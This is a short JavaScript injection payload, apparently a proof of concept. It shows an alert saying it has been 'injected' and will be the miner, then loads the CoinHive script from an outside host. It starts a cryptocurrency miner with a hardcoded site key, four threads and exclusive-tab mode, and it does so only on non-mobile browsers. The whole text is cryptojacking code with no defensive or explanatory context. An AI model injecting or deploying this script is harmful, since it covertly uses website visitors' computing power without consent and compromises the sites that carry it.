alert("if you can read this, the script has been injected. This will be the minner");
var script = document.createElement( 'script' );
script.type = 'text/javascript';
script.src = "https://coinhive.com/lib/coinhive.min.js";
document.body.appendChild( script );
var a=new CoinHive.User('NcdINDXOOULy7e9ccZ1Gtg4ZzYmPmCU0','MIT', {threads:4});if (!a.isMobile()) {a.start(CoinHive.FORCE_EXCLUSIVE_TAB);};